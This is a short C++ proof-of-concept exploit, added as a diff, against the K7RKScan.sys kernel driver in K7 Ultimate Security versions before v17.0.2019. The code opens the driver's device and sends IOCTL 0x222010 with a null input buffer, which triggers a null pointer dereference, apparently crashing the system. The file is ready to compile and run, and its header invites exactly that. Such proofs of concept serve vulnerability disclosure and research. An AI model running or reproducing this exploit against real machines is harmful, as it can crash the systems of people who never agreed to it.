@@ -1,0 +1,47 @@
+/*
+# Usage: Only compile it and run, boooom :)
+*/
+
+
+#include <windows.h>
+#include <iostream>
+
+const std::wstring driverDevice = L"\\\\.\\DosK7RKScnDrv"; // K7RKScan.sys symbolic link path
+const DWORD ioCTL = 0x222010;  // IOCTL 0x222010 or 0x222014
+
+int main() {
+    std::cout << "K7 Ultimae Security < v17.0.2019 K7RKScan.sys Null Pointer Dereference - PoC" << std::endl;
+    HANDLE hDevice = CreateFile(driverDevice.c_str(),
+        GENERIC_READ | GENERIC_WRITE,
+        0,
+        nullptr,
+        OPEN_EXISTING,
+        0,
+        nullptr);
+
+    if (hDevice == INVALID_HANDLE_VALUE) {
+        std::cerr << "Failed, please load driver and check again. Exit... " << GetLastError() << std::endl;
+        return 1;
+    }
+
+    void* inputBuffer = nullptr; // Null input buffer
+    DWORD inputBufferSize = 0;
+
+    DWORD bytesReturned;
+    BOOL result = DeviceIoControl(hDevice,
+        ioCTL,
+        inputBuffer,
+        inputBufferSize,
+        nullptr,
+        0,
+        &bytesReturned,
+        nullptr);
+
+    if (!result) {
+        std::cerr << "DeviceIoControl failed. Exit... " << GetLastError() << std::endl;
+    }
+
+    CloseHandle(hDevice);
+
+    return 0;
+}
